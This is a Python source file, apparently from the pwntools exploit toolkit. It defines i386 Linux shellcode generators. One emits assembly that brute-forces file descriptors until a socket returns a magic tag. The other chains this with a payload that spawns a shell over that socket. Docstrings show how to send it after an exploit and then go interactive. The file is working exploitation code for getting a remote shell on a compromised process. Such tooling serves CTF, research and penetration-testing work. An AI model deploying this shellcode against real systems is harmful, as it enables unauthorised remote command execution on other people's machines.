from pwn.shellcode_helper import *
from .. import dupsh

@shellcode_reqs(arch='i386', os='linux', network=['ipv4', 'ipv6'])
def findtagsh(tag):
    """Args: Tag to look for

    Finds the current file descriptor using the findtag
    shellcode, and then runs a dupsh.
    
    Common use case:

    sock.send_exploit()
    sock.send(findtagsh(TAG))
    time.sleep(0.1)
    sock.send(TAG.ljust(127))
    sock.interactive()"""
    return findtag(tag), dupsh("ebp")

@shellcode_reqs(arch='i386', os='linux', network=['ipv4', 'ipv6'])
def findtag(tag):
    """Args: tag to look for
    Tries to recv up to 127 bytes (nonblocking) from every file descriptor
    in the range [0, 65535] until one is found that outputs the magic tag as
    the first 4 bytes. If none is found, it continues to try, until it works.
    When one is found, it is left in ebp.
    
    A side effect if this is that it can be used to remove garbage from a socket,
    and will still work as long as the magic tag is "in there somewhere" and
    as long as the magic tag becomes the first 4 bytes of the output from recv.

    Thus a possible way to use it is something like:

    sock.do_exploit()
    sock.send(findtag(TAG) + foo_shellcode('ebp') + GARBAGE)
    time.sleep(0.5) # Here so that the findtag will have time to remove the garbarge
    sock.send(TAG.ljust(127))
    sock.talk_with_foo_shellcode()

    On my test system, it could clean out about 4k of garbage per second.
"""

    return """
findtag:
    push cs                  ; This is just a placeholder, which should not match the cookie.
                             ; cs is chosen since it always contains null-bytes and thus is
                             ; unlikely to be chosen as a cookie


    push SYS_socketcall
    push ecx                 ; placeholder for now
    push MSG_DONTWAIT
    push 0x7f
    push esp                 ; placeholder for now
    push 1
    push esp
    push edi
    popad

.loop:
    inc bp
    mov ecx, esi
    pushad
    mov bl, SYS_socketcall_recv
    int 0x80
    popad
    pop edi
    cmp edi, 0x%08x
    push edi
    jne .loop
""" % int(tag)
